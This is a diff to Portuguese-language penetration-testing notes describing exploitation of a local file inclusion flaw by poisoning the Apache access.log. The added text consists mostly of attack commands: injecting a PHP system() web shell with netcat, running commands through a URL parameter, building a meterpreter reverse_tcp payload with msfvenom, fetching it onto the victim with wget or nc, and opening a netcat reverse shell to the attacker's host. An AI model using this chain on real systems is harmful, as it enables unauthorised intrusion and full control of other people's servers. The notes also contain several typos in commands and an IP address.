@@ -254,13 +254,68 @@ EX: arquivos de configuração, logs de aplicações e etc.
 
 Caso tenhamos acesso ao access.log do apache da aplicação remota, sera importante acessar o arquivo via browser, para identificar possivel falha.
 
-Na maquina linux, execu
+http://192.168.1.11/page=/var/log/apache2/access.log
 
-Para explorar a aplicação, é preciso gerar o arquivo infectado no kali:
+Na maquina linux, executar o netcat com destino a vitima e digitar "<?php system($GET_['comando']); ?>":
+
+nc 192.168.1.11 80
+<?php system($GET_['comando']); ?>
+
+Apos a execução acima, verificar na aplicação, no log access.log, se ha logs referente a essa requisição, caso haja, e o log reclame de que a variavel comando esta vazia, significa que a aplicação esta vulneravel, e poderemos injetar comandos.
+
+Digitar na URL:
+
+http://192.168.1.11/comando=ls -la&page=/var/log/apache2/access.log
+###Repare que inserimos o "comando=ls" na url.
+
+Para explorar a aplicação e obter acesso meterpreter, é preciso gerar o arquivo infectado no kali:
 
 msfvenon -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -f elf > shell
 ###O formato passado pelo parametro "-f" é o padrão de execução do linux "elf"
 ###No linux, é preciso especificar no payload, a arquitetura do sistema, nesse exemplo o "x86"
 
+Para jogarmos o arquivo para dentro da aplicação, podemos usar a falha encontrada na URL:
+
+No kali, executando o apache, jogamos o arquivo "shell" para o diretorio /var/www/html" e usando o wget na url vitima:
+http://192.168.1.11/comando=wget http://192.168.10/shell&page=/var/log/apache2/access.log
+###Repare que usamos o "comando=wget http://192.168.10/shell" para baixar o arquivo infectado.
+
+###Podemos usar o netcat tambem
+
+no Kali:
+
+nc -nlpv 4000 < shell
+
+Na Vitima:
+
+comando=nc 192.168.1.10 4000 > shell
+
+#####################Podemos tambem ganhar acesso ao shell pelo netcat, conforme ja visto:
+
+no Kali:
+
+nc -nvla 2800
+
+Na vitima:
+
+comando=nc 192.168.1.10 2800 -e /bin/bash
+
+Para efetivar o uso do meterpreter, é preciso dar permissão de execução do arquivo na vitima.
+
+Pelo shell ganho via "nc":
+chmod +x shell
+
+Via URL da vitima:
+comando=chmod +x shell
+
+Realizar a configuração do mult/handler para usar o payload "linux/x86/meterpreter/reverse_tcp
+
+dar o exploit.
+
+###Nesse ponto, aguardamos a execão do arquivo infectado na maquina vitima. Podemos usar o shell para executar o arquivo "shell"
+
+./shell (na sessão do nc) ou na URL
+
+###Se tudo ocorrer bem, ja teremos acesso ao sustema completo.
 
 
